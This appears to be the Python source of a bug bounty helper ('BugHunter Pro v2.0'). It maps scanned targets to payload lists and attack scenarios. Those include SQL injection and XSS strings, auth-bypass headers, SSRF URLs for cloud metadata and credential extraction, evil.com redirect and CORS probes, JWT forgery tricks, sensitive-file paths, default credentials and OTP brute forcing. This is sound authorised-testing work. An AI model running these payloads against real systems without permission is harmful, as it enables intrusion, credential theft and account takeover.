"""
payloads_engine.py — Smart Payload & Scenario Engine  v2.0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
New in v2.0:
  ✅ SSRF payloads
  ✅ Subdomain Takeover scenario
  ✅ CORS scenario
  ✅ Docker / Kubernetes scenarios
  ✅ Business Logic hints
  ✅ 2FA bypass scenarios
  ✅ OAuth/SSO attacks
"""

from pathlib import Path
from datetime import datetime
from typing import List, Dict, Any

from utils import log, Colors


# ─────────────────────────────────────────────
#  Payload Library
# ─────────────────────────────────────────────

PAYLOADS = {
    "IDOR": {
        "description": "Insecure Direct Object Reference — change numeric/predictable IDs",
        "payloads": [
            "id=1  →  id=2",
            "user_id=100  →  user_id=101",
            "account=admin  →  account=user",
            "invoice_id=1000  →  invoice_id=999",
            "order=ABC  →  order=ABD",
            "uuid=<target>  →  enumerate or decode",
            "GUID/UUID: try sequential or null UUID",
            "Negative IDs: id=-1, id=0",
        ],
        "steps": [
            "1. Identify endpoints with numeric or predictable IDs",
            "2. Send request with id=1 and note full response",
            "3. Change to id=2 and compare — different data = IDOR",
            "4. Try negative IDs (-1, 0) and very large numbers",
            "5. Test mass assignment via PUT/PATCH with other user IDs",
        ],
        "impact": "Access to other users' data without authorization (P1-P2)",
    },

    "AUTH_BYPASS": {
        "description": "Authentication Bypass — access protected resources without credentials",
        "payloads": [
            "Remove Authorization header entirely",
            "Authorization: Bearer null",
            "Authorization: Bearer undefined",
            "Authorization: Bearer 0",
            "X-Forwarded-For: 127.0.0.1",
            "X-Real-IP: 127.0.0.1",
            "X-Original-URL: /admin",
            "X-Rewrite-URL: /admin",
            "X-Custom-IP-Authorization: 127.0.0.1",
            "admin=true (add param)",
            "role=admin (add param)",
        ],
        "steps": [
            "1. Capture an authenticated request in Burp",
            "2. Remove the Authorization header — replay",
            "3. Try adding X-Forwarded-For: 127.0.0.1",
            "4. Try modifying JWT claims (alg: none attack)",
            "5. Try adding ?admin=true or &role=superuser",
        ],
        "impact": "Full unauthorized access to protected functionality (P1)",
    },

    "SQLI": {
        "description": "SQL Injection — detect DB errors or data leakage",
        "payloads": [
            "'",
            '"',
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            "' OR 1=1#",
            "'; SELECT SLEEP(0)--",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND (SELECT 1 FROM information_schema.tables LIMIT 1)='1",
        ],
        "steps": [
            "1. Find input parameters (URL, POST body, headers, cookies)",
            "2. Insert single quote — watch for SQL errors",
            "3. Try OR 1=1 to check boolean injection",
            "4. Use sqlmap with --level=1 --risk=1 for confirmation",
            "5. Never use SLEEP values > 0 without permission",
        ],
        "impact": "Data extraction, authentication bypass, RCE (P1)",
    },

    "XSS": {
        "description": "Cross-Site Scripting — check for reflected/stored input",
        "payloads": [
            "<bughunter_test>",
            "<script>alert(document.domain)</script>",
            '"><svg/onload=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "{{7*7}} (SSTI check)",
            "${7*7} (SSTI check)",
            "<details open ontoggle=alert(1)>",
        ],
        "steps": [
            "1. Find all input reflection points (URL params, forms, JSON)",
            "2. Start with a unique marker: <bughunter_test>",
            "3. Check if marker appears in HTML response (view source)",
            "4. If reflected, test full XSS payload",
            "5. Check Content-Security-Policy header for bypass opportunities",
        ],
        "impact": "Cookie theft, account takeover, phishing (P2-P3)",
    },

    "SSRF": {
        "description": "Server-Side Request Forgery — make server fetch internal resources",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",     # AWS
            "http://169.254.169.254/latest/user-data/",      # AWS user-data
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://127.0.0.1:80",
            "http://127.0.0.1:22",
            "http://localhost:6379",  # Redis
            "http://0.0.0.0:80",
            "http://[::]:80",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
        ],
        "steps": [
            "1. Find parameters that accept URLs (url=, redirect=, fetch=, src=)",
            "2. Send AWS metadata endpoint as payload",
            "3. Use Burp Collaborator / webhook.site for blind SSRF",
            "4. Test internal port scanning via SSRF",
            "5. Try protocol wrappers: file://, dict://, gopher://",
        ],
        "impact": "Cloud credentials theft, internal network access, RCE (P1)",
    },

    "CORS": {
        "description": "CORS Misconfiguration — arbitrary origin reflection",
        "payloads": [
            "Origin: https://evil.com",
            "Origin: null",
            "Origin: https://TARGET.evil.com",
            "Origin: https://evil-TARGET.com",
            "Origin: https://TARGET.com.evil.com",
        ],
        "steps": [
            "1. Send request with Origin: https://evil.com header",
            "2. Check if Access-Control-Allow-Origin reflects evil.com",
            "3. Check if Access-Control-Allow-Credentials: true",
            "4. If both true: full account takeover possible!",
            "5. Test with Origin: null (Null origin bypass)",
        ],
        "impact": "Cross-origin data theft, account takeover if with-credentials (P2)",
    },

    "JWT": {
        "description": "JWT attacks — algorithm confusion, none algorithm, weak secret",
        "payloads": [
            'alg: "none" — remove signature entirely',
            'alg: "HS256" with public key (RS256 → HS256 confusion)',
            "kid injection: ../../dev/null",
            "jku/x5u: point to attacker server",
            'Add role: "admin" to payload',
            'Change user_id or sub to another value',
            "Expired token — is exp enforced?",
        ],
        "steps": [
            "1. Decode JWT at jwt.io",
            "2. Change alg to 'none', remove signature",
            "3. Try RS256→HS256 confusion attack with public key",
            "4. Check 'exp' claim — is it enforced?",
            "5. Check if JWT secret is weak (brute: hashcat -a 0 -m 16500)",
        ],
        "impact": "Authentication bypass, privilege escalation (P1)",
    },

    "SENSITIVE_FILES": {
        "description": "Sensitive File Exposure — access config/credentials files",
        "payloads": [
            "/.env", "/config.json", "/config.yaml",
            "/.git/HEAD", "/.git/config",
            "/database.yml", "/secrets.yaml",
            "/wp-config.php", "/.htpasswd",
            "/credentials.json", "/.aws/credentials",
            "/backup.zip", "/backup.tar.gz",
            "/db.sqlite", "/dump.sql",
            "/.DS_Store", "/composer.json",
        ],
        "steps": [
            "1. Use ffuf/dirsearch to discover files",
            "2. Focus on config, backup, and VCS files",
            "3. Check .git exposure: /.git/HEAD returns 200?",
            "4. Try backup extensions: .bak, .old, .backup, ~",
            "5. Check robots.txt for disallowed (sensitive) paths",
        ],
        "impact": "Credential leak, API key exposure, full system compromise (P1)",
    },

    "OPEN_REDIRECT": {
        "description": "Open Redirect — manipulate redirect parameters",
        "payloads": [
            "?redirect=https://evil.com",
            "?next=//evil.com",
            "?url=https://evil.com",
            "?return_to=//evil.com",
            "?redirect_uri=https://evil.com",
            "?returnUrl=%2F%2Fevil.com",
            "?to=/\\evil.com",
            "?goto=http:evil.com",
        ],
        "steps": [
            "1. Find redirect parameters in URLs",
            "2. Try redirecting to external domain",
            "3. Check if application validates the redirect target",
            "4. Try URL encoding and double encoding",
            "5. Test in OAuth flow — often leads to token theft",
        ],
        "impact": "Phishing attacks, OAuth token theft (P3)",
    },

    "DEBUG_ENDPOINTS": {
        "description": "Debug/Dev endpoint exposure",
        "payloads": [
            "/debug", "/trace", "/test",
            "/actuator", "/actuator/env", "/actuator/health",
            "/_debug", "/phpinfo.php",
            "/server-status", "/server-info",
            "/console", "/swagger-ui.html",
            "/h2-console", "/druid/index.html",
            "/api-docs", "/graphiql",
        ],
        "steps": [
            "1. Enumerate common debug paths with ffuf",
            "2. Check Spring Boot Actuator endpoints (/actuator/env is critical)",
            "3. Look for Swagger/OpenAPI documentation",
            "4. Check if debug mode reveals stack traces",
            "5. Test H2/Druid console for RCE",
        ],
        "impact": "Info disclosure, config exposure, RCE via debug console (P1-P3)",
    },

    "HOST_HEADER": {
        "description": "Host Header Injection — password reset link poisoning",
        "payloads": [
            "Host: evil.com",
            "Host: target.com.evil.com",
            "X-Forwarded-Host: evil.com",
            "X-Host: evil.com",
            "X-Forwarded-Server: evil.com",
        ],
        "steps": [
            "1. Trigger a password reset request",
            "2. Change Host header to evil.com",
            "3. Check if reset link in email uses injected host",
            "4. Also test for cache poisoning via Host header",
        ],
        "impact": "Account takeover via poisoned reset links (P2)",
    },

    "SUBDOMAIN_TAKEOVER": {
        "description": "Subdomain Takeover — claim abandoned external service",
        "payloads": [
            "GitHub Pages: create username.github.io repo",
            "Heroku: claim the app name",
            "AWS S3: create bucket with subdomain name",
            "Azure: claim the subdomain in Azure portal",
        ],
        "steps": [
            "1. Identify subdomains pointing to external services (CNAME)",
            "2. Check if the pointed service account/resource exists",
            "3. If not: claim it on the provider",
            "4. Prove control by hosting a custom page",
        ],
        "impact": "Full subdomain control, cookie theft, phishing (P1-P2)",
    },

    "BUSINESS_LOGIC": {
        "description": "Business Logic Flaws — exploit application workflow",
        "payloads": [
            "Skip payment step and go directly to order confirmation",
            "Use negative quantities in shopping cart",
            "Replay successful payment response for free order",
            "Manipulate discount/coupon codes",
            "Race condition on limited-use vouchers",
            "Bypass subscription tier checks",
        ],
        "steps": [
            "1. Map out the application's business workflows",
            "2. Try to skip steps or perform them out of order",
            "3. Test negative values in numeric inputs",
            "4. Look for race conditions on one-time use items",
            "5. Test for price manipulation in hidden form fields",
        ],
        "impact": "Financial loss, unauthorized access to premium features (P1-P2)",
    },

    "2FA_BYPASS": {
        "description": "Two-Factor Authentication Bypass",
        "payloads": [
            "Skip 2FA step — go directly to /dashboard",
            "Response manipulation: change 'success': false → true",
            "Replay previously used OTP (no invalidation?)",
            "Try OTP on different account (no binding?)",
            "Brute force 6-digit OTP (rate limit?)",
            "Use backup codes",
        ],
        "steps": [
            "1. After 1st factor, go directly to authenticated area",
            "2. Intercept 2FA response: change false → true",
            "3. Try a valid OTP from another session",
            "4. Try brute forcing OTP (check rate limiting)",
            "5. Check if 2FA can be disabled via API without 2FA confirmation",
        ],
        "impact": "Authentication bypass, full account takeover (P1)",
    },
}


# ─────────────────────────────────────────────
#  Bug Bounty Scenarios
# ─────────────────────────────────────────────

SCENARIOS = [
    {
        "id":       "S1",
        "name":     "IDOR on REST API",
        "trigger":  lambda url, tags, tech: "API" in tags,
        "scenario": "API endpoint with numeric IDs detected. Prime candidate for IDOR (P1-P2).",
        "actions": [
            "Enumerate /api/v1/users/{id} from id=1 to id=100",
            "Check if you can access another user's profile/data",
            "Try accessing resources with only your token but different IDs",
            "Test mass assignment: PUT/PATCH with other user IDs",
            "Test UUIDs: try null UUID (00000000-0000-0000-0000-000000000000)",
        ],
        "severity": "HIGH",
    },
    {
        "id":       "S2",
        "name":     "Exposed Admin Panel",
        "trigger":  lambda url, tags, tech: "ADMIN" in tags,
        "scenario": "Admin interface detected. Unauthorized access = critical vulnerability.",
        "actions": [
            "Test default credentials: admin/admin, admin/password, admin/123456",
            "Attempt auth bypass via header manipulation",
            "Check for password reset on admin accounts",
            "Inspect JavaScript files for hidden API keys",
            "Test for SQL injection on login form",
        ],
        "severity": "CRITICAL",
    },
    {
        "id":       "S3",
        "name":     "Staging / Dev Environment",
        "trigger":  lambda url, tags, tech: "DEV" in tags,
        "scenario": "Development/staging environment found. Often has weaker security.",
        "actions": [
            "Access the app without authentication",
            "Look for debug endpoints (/.env, /debug, /trace)",
            "Check if staging has real production data",
            "Look for verbose error messages with stack traces",
            "Check for source code exposure (.git, .svn)",
        ],
        "severity": "HIGH",
    },
    {
        "id":       "S4",
        "name":     "Sensitive File / Config Exposure",
        "trigger":  lambda url, tags, tech: any(
            kw in url.lower() for kw in ["config", "backup", "env", ".git", "setting"]
        ),
        "scenario": "Configuration or backup files may be accessible.",
        "actions": [
            "Check /.env for database credentials and API keys",
            "Check /.git/HEAD — if accessible, dump entire git history with git-dumper",
            "Look for .backup, .old, .bak file extensions",
            "Check /robots.txt for disallowed (sensitive) paths",
            "Try /api/config, /api/settings for config dumps",
        ],
        "severity": "CRITICAL",
    },
    {
        "id":       "S5",
        "name":     "Login Functionality Weaknesses",
        "trigger":  lambda url, tags, tech: "LOGIN" in tags,
        "scenario": "Login/auth endpoint detected. Multiple high-severity attack paths.",
        "actions": [
            "Test account enumeration: different error for valid vs invalid user?",
            "Test password reset flow: weak/reusable tokens?",
            "Check for session fixation before/after login",
            "Look for 2FA bypass (skip step, repeat token, response manipulation)",
            "Test Host Header Injection → poisoned reset email",
        ],
        "severity": "HIGH",
    },
    {
        "id":       "S6",
        "name":     "WordPress-Specific Attacks",
        "trigger":  lambda url, tags, tech: "WordPress" in tech,
        "scenario": "WordPress installation detected. Known attack surface.",
        "actions": [
            "Enumerate users: /wp-json/wp/v2/users",
            "Check /xmlrpc.php — enabled? (auth bypass, SSRF, DoS)",
            "Run wpscan for outdated plugins with known CVEs",
            "Check /wp-admin accessible from internet?",
            "Test weak passwords via xmlrpc.php brute force",
        ],
        "severity": "MEDIUM",
    },
    {
        "id":       "S7",
        "name":     "GraphQL Introspection",
        "trigger":  lambda url, tags, tech: "GraphQL" in tech,
        "scenario": "GraphQL endpoint detected. Introspection may expose entire schema.",
        "actions": [
            "Send introspection query: {__schema{types{name}}}",
            "Map all queries, mutations, and subscriptions",
            "Look for admin mutations accessible without auth",
            "Test for batch query attacks / DoS via nested queries",
            "Check for IDOR via ID-based queries",
        ],
        "severity": "HIGH",
    },
    {
        "id":       "S8",
        "name":     "JWT Token Manipulation",
        "trigger":  lambda url, tags, tech: "JWT" in tech,
        "scenario": "JWT authentication detected. Multiple attack vectors available.",
        "actions": [
            "Decode token at jwt.io — check algorithm and claims",
            "Try algorithm confusion: change RS256 → HS256",
            "Try alg: none attack",
            "Check if token expiry (exp) is enforced",
            "Try adding role=admin or is_admin=true to payload",
        ],
        "severity": "HIGH",
    },
    {
        "id":       "S9",
        "name":     "SSRF via URL Parameters",
        "trigger":  lambda url, tags, tech: "API" in tags or any(
            p in url.lower() for p in ["fetch", "import", "webhook", "callback", "proxy"]
        ),
        "scenario": "Endpoint may accept URLs as parameters — SSRF risk.",
        "actions": [
            "Test: ?url=http://169.254.169.254/latest/meta-data/ (AWS)",
            "Use Burp Collaborator for blind SSRF detection",
            "Try internal IPs: 127.0.0.1, 10.0.0.1, 192.168.1.1",
            "Test protocol wrappers: file://, gopher://, dict://",
            "If AWS: extract IAM credentials from metadata",
        ],
        "severity": "CRITICAL",
    },
    {
        "id":       "S10",
        "name":     "CORS Misconfiguration",
        "trigger":  lambda url, tags, tech: "API" in tags,
        "scenario": "API endpoint — test for CORS origin reflection.",
        "actions": [
            "Send Origin: https://evil.com with authenticated request",
            "Check if ACAO reflects evil.com",
            "Check if ACAC is 'true' — if YES: critical (account takeover)!",
            "Test null origin: Origin: null",
            "Test subdomain bypass: Origin: TARGET.evil.com",
        ],
        "severity": "HIGH",
    },
    {
        "id":       "S11",
        "name":     "Docker / Kubernetes Exposure",
        "trigger":  lambda url, tags, tech: "DEVOPS" in tags or any(
            t in tech for t in ["Docker", "Kubernetes"]
        ),
        "scenario": "DevOps infrastructure detected. Critical attack surface.",
        "actions": [
            "Check port 2375 for unauthenticated Docker API",
            "Test /api/v1/ on Kubernetes API server",
            "Check /metrics endpoint for Prometheus data",
            "Look for kubectl config files or service account tokens",
            "Test registry access for Docker image listing",
        ],
        "severity": "CRITICAL",
    },
    {
        "id":       "S12",
        "name":     "2FA / MFA Bypass",
        "trigger":  lambda url, tags, tech: "LOGIN" in tags,
        "scenario": "Authentication endpoint — test 2FA bypass techniques.",
        "actions": [
            "After 1st factor, directly navigate to /dashboard or /home",
            "Intercept 2FA response and change 'success': false to true",
            "Replay a previously used valid OTP",
            "Try OTP on a different account (binding check)",
            "Test rate limiting on OTP entry (brute force 000000-999999)",
        ],
        "severity": "HIGH",
    },
]


# ─────────────────────────────────────────────
#  PayloadsEngine
# ─────────────────────────────────────────────

class PayloadsEngine:
    def __init__(self, output: Path):
        self.output = output

    def generate(self, targets: List[Dict[str, Any]], tech_map: Dict[str, List[str]]):
        log(f"[payloads] 💣 Generating context-aware payloads (v2.0)...", Colors.YELLOW)

        all_payloads       = []
        all_scenarios      = []
        attack_suggestions = []

        for target in targets:
            if target["score"] < 40:
                continue

            url  = target["url"]
            tags = target.get("tags", [])
            tech = tech_map.get(url, target.get("tech", []))

            selected = self._select_payloads(tags, tech)
            all_payloads.append({
                "url":      url,
                "score":    target["score"],
                "payloads": selected,
            })

            matched = self._match_scenarios(url, tags, tech)
            all_scenarios.extend(matched)

            for scenario in matched:
                attack_suggestions.append({
                    "url":      url,
                    "scenario": scenario["name"],
                    "actions":  scenario["actions"],
                    "severity": scenario["severity"],
                })

        self._write_payloads(all_payloads)
        self._write_scenarios(all_scenarios, targets)
        self._write_attack_suggestions(attack_suggestions)

    def _select_payloads(self, tags: List[str], tech: List[str]) -> List[str]:
        selected_keys = set()

        if "API" in tags:
            selected_keys.update(["IDOR", "AUTH_BYPASS", "SQLI", "XSS", "SSRF", "CORS"])
        if "ADMIN" in tags:
            selected_keys.update(["AUTH_BYPASS", "DEBUG_ENDPOINTS", "HOST_HEADER"])
        if "LOGIN" in tags:
            selected_keys.update(["AUTH_BYPASS", "SQLI", "HOST_HEADER", "2FA_BYPASS"])
        if "DEV" in tags:
            selected_keys.update(["DEBUG_ENDPOINTS", "SENSITIVE_FILES", "SSRF"])
        if "WordPress" in tech:
            selected_keys.update(["SQLI", "XSS", "SENSITIVE_FILES"])
        if "GraphQL" in tech:
            selected_keys.add("IDOR")
        if "JWT" in tech:
            selected_keys.add("JWT")

        # Always add these for any scored target
        selected_keys.update(["SENSITIVE_FILES", "SUBDOMAIN_TAKEOVER"])

        if not selected_keys:
            selected_keys.update(["SENSITIVE_FILES", "DEBUG_ENDPOINTS"])

        return list(selected_keys)

    def _match_scenarios(self, url: str, tags: List[str], tech: List[str]) -> List[Dict]:
        matched = []
        for scenario in SCENARIOS:
            try:
                if scenario["trigger"](url, tags, tech):
                    matched.append(scenario)
                    log(f"[payloads] 🎯 Scenario: {scenario['name']} → {url}", Colors.YELLOW)
            except Exception:
                pass
        return matched

    def _write_payloads(self, all_payloads: List[Dict]):
        out = self.output / "payloads.txt"
        with open(out, "w") as f:
            f.write("# BugHunter Pro v2.0 — Context-Aware Payloads\n")
            f.write(f"# Generated: {datetime.now()}\n\n")

            for entry in all_payloads:
                f.write(f"{'─'*60}\n")
                f.write(f"TARGET : {entry['url']} (score: {entry['score']})\n")
                f.write(f"PAYLOAD CATEGORIES: {', '.join(entry['payloads'])}\n\n")

                for key in entry["payloads"]:
                    pl = PAYLOADS.get(key)
                    if not pl:
                        continue
                    f.write(f"  [{key}] {pl['description']}\n")
                    for p in pl["payloads"][:5]:
                        f.write(f"    → {p}\n")
                    f.write(f"  IMPACT: {pl['impact']}\n\n")

        log("[payloads] payloads.txt written", Colors.GREEN)

    def _write_scenarios(self, scenarios: List[Dict], targets: List[Dict]):
        out = self.output / "scenarios.txt"
        seen = set()

        with open(out, "w") as f:
            f.write("# BugHunter Pro v2.0 — Bug Bounty Scenarios\n")
            f.write(f"# Generated: {datetime.now()}\n\n")

            for s in scenarios:
                if s["id"] in seen:
                    continue
                seen.add(s["id"])

                icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(s["severity"], "⚪")
                f.write(f"{'═'*60}\n")
                f.write(f"{icon} SCENARIO {s['id']}: {s['name']} [{s['severity']}]\n")
                f.write(f"{'═'*60}\n")
                f.write(f"{s['scenario']}\n\n")
                f.write("ACTIONS:\n")
                for action in s["actions"]:
                    f.write(f"  → {action}\n")
                f.write("\n")

        log("[payloads] scenarios.txt written", Colors.GREEN)

    def _write_attack_suggestions(self, suggestions: List[Dict]):
        out = self.output / "attack_suggestions.txt"
        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}

        sorted_suggestions = sorted(
            suggestions,
            key=lambda x: (sev_order.get(x["severity"], 99), x["url"])
        )

        with open(out, "w") as f:
            f.write("# BugHunter Pro v2.0 — Attack Suggestions\n")
            f.write(f"# Generated: {datetime.now()}\n\n")

            for s in sorted_suggestions:
                icon = {"CRITICAL": "🔴", "HIGH": "🟠",
                        "MEDIUM": "🟡", "LOW": "🟢"}.get(s["severity"], "⚪")
                f.write(f"{icon} [{s['severity']}] {s['scenario']}\n")
                f.write(f"   TARGET: {s['url']}\n")
                for action in s["actions"]:
                    f.write(f"   • {action}\n")
                f.write("\n")

        log("[payloads] attack_suggestions.txt written", Colors.GREEN)
